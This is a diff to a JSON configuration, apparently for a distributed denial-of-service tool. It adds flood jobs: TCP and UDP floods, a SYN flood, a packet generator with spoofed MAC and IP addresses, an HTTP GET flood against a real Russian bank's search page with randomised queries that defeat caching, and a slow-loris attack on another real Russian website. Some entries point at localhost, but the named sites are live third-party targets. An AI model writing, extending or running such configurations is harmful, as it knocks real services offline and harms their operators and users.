@@ -12,6 +12,76 @@
           "proxy_urls": "{{ get_proxylist }}"
         }
       }
+    },
+    {
+      "type": "tcp",
+      "args": {
+        "address": "localhost:9090",
+        "header": "test",
+        "body": "more_test"
+      }
+    },
+    {
+      "type": "udp",
+      "count": 100,
+      "args": {
+        "address": "localhost:9191",
+        "header": "test",
+        "body": "more_test",
+        "interval_ms": 1000
+      }
+    },
+    {
+      "type": "http",
+      "args": {
+        "method": "GET",
+        "path": "https://www.sberbank.ru/ru/search?searchid={{ random_uuid }}&l10n=ru&reqenc=&text={{ random_uuid }}",
+        "headers": {}
+      }
+    },
+    {
+      "type": "syn-flood",
+      "args": {
+        "host": "localhost",
+        "port": 80,
+        "payload_len": 1000,
+        "flood_type": "random"
+      }
+    },
+    {
+      "type": "slow-loris",
+      "args": {
+        "path": "https://kapital-rus.ru/inc2/common/js/doo/modules/searchSite/u.php"
+      }
+    },
+    {
+      "type": "packetgen",
+      "args": {
+        "host": "{{ random_ip }}",
+        "port": "{{ random_port }}",
+        "packet": {
+          "payload": "test:blah",
+          "ethernet": {
+            "src_mac": "{{ random_mac_addr }}",
+            "dst_mac": "{{ random_mac_addr }}"
+          },
+          "ip": {
+            "src_ip": "{{ local_ip }}",
+            "dst_ip": "{{ random_ip }}"
+          },
+          "tcp": {
+            "src_port": "{{ random_port }}",
+            "dst_port": "{{ random_port }}",
+            "flags": {
+              "syn": true
+            }
+          },
+          "udp": {
+            "src_port": "{{ random_port }}",
+            "dst_port": "{{ random_port }}"
+          }
+        }
+      }
     }
   ]
 }
